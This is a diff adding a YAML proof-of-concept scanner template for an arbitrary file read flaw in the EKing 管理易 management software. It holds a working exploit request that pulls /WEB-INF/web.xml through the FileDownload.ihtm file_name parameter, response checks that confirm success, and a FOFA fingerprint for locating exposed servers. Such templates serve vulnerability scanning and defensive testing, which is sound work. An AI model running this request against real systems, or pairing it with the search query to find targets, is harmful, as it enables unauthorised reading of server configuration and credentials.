@@ -1,0 +1,15 @@
+id: poc-yaml-eking-filedownload-anyfile-read
+info:
+  name: eking管理易 FileDownload 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 管理易
+  fofa: app="EKing-管理易"
+requests:
+- method: GET
+  path: /FileDownload.ihtm?file_name=/WEB-INF/web.xml
+  expression: status_code == 200 && contains(body,"</web-app>") && contains(body,"<display-name>")
+    && contains(headers,"filename=") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
